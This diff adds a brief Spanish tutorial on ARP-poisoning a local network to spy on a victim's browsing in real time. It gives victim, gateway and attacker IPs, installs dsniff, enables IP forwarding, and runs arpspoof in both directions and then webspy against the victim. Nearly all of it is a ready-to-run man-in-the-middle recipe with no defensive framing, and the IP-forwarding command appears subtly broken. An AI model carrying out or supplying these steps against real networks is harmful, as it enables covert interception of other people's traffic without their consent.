@@ -1,0 +1,33 @@
+Veremos como tan sólo conectandonos a una red fisicamente, podemos snifar en
+tiempo real las paginas webs que está visitando un equipo de la red.
+
+
+HOST A -> Victima (192.168.1.33)
+HOST c -> Puerta enlace de la red (192.168.1.1)
+HOST B -> Atacante (maquina en la que ejecutamos el arpspoof)
+
+
+Herramientas :
+
+# dsniff -> apt-get install dsniff
+# netscape -> ftp://ftp.netscape.com/pub/netscape7/english/7.2/unix/linux/netscape-i686-pc-linux-gnu-installer.tar.gz
+# Para netscape necesitaremos la libreria libgtk1.2 
+
+Reenviar trafico para ARP
+
+# echo 1> /proc/sys/net/ipv4/ip_forward
+
+envenenamiento ARP
+
+# arpspoof -i eth0 -t 192.168.1.33 192.168.1.1
+# arpspoof -i eth0 -t 192.168.1.1 192.168.1.33
+
+(ejecutamos arpspoof en dos consolas para controlar los dos carriles)
+
+# webspy -i eth0 192.168.1.33
+
+Y veremos las webs que visita el host A en tiempo real, en nuestro netscape.
+Evidentemente las webs encriptadas no las veremos.
+
+
+
